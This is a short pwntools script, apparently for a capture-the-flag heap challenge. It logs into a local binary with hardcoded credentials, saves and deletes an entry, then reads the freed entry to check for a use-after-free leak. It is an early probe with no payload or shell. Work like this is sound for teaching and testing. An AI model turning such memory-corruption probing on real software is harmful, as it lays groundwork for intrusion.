from pwn import *
context.log_level='info'
p=process('./pwn', cwd='.')
def menu(n):
    p.sendlineafter(b'> ',str(n).encode())
def save(i,s,d):
    menu(1); p.sendlineafter(b'Input the key: ',str(i).encode()); p.sendlineafter(b'Input the value size: ',str(s).encode()); p.sendafter(b'Input the value: ',d)
def readv(i):
    menu(2); p.sendlineafter(b'Input the key: ',str(i).encode()); return p.recvuntil(b'******************************',timeout=1)
def delete(i):
    menu(3); p.sendlineafter(b'Input the key: ',str(i).encode())
p.sendlineafter(b'Input your username:',b'admin')
p.sendlineafter(b'Input your password:',b's4cur1ty_p4ssw0rd')
save(0,8,b'ABCDEFGH'); delete(0)
try:
    print('READ-FREED',readv(0))
except Exception as e:
    print(type(e).__name__,e)
p.close()
